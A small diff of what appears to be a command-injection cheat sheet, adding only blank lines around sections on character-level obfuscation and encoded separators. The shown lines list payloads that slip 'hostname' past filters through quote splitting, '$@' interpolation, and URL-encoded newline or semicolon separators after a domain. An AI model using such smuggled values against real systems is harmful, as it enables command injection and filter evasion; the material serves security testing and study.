@@ -29,6 +29,7 @@
 ### Character-Level Obfuscation
 
 ```bash
+
 # Original command blocked: hostname
 h"o"st"na"me  # String concatenation
 ho$@stname     # Variable interpolation
@@ -36,6 +37,7 @@ ho$@stname     # Variable interpolation
 
 Encoding & Separation
 bash
+
 # Using alternative separators
 google.com%0Ahostname    # Newline (URL encoded)
 google.com%3Bhostname    # Semicolon (URL encoded)
